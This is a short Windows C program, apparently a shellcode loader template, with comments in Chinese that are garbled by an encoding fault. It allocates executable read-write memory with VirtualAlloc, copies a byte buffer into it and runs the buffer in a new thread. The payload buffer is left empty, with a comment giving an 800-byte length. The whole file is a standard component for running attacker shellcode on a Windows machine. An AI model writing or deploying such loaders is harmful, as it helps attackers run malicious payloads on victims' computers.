#include <Windows.h>// ��ں���
int wmain(int argc,TCHAR * argv[]){
    int shellcode_size = 0; // shellcode����
    DWORD dwThreadId; // �߳�ID
    HANDLE hThread; // �߳̾��
/* length: 800 bytes */
unsigned char buf[] = "";
// ��ȡshellcode��С
shellcode_size = sizeof(buf);
/*
VirtualAlloc(
    NULL, // ��ַ
    800,  // ��С
    MEM_COMMIT, // �ڴ�ҳ״̬
    PAGE_EXECUTE_READWRITE // �ɶ���д��ִ��
    );
*/
char * shellcode = (char *)VirtualAlloc(
    NULL,
    shellcode_size,
    MEM_COMMIT,
    PAGE_EXECUTE_READWRITE
    );
    // ��shellcode���Ƶ���ִ�е��ڴ�ҳ��
CopyMemory(shellcode,buf,shellcode_size);
hThread = CreateThread(
    NULL, // ��ȫ������
    NULL, // ջ�Ĵ�С
    (LPTHREAD_START_ROUTINE)shellcode, // ����
    NULL, // ����
    NULL, // �̱߳�־
    &dwThreadId // �߳�ID
    );
WaitForSingleObject(hThread,INFINITE); // һֱ�ȴ��߳�ִ�н���
    return 0;
}
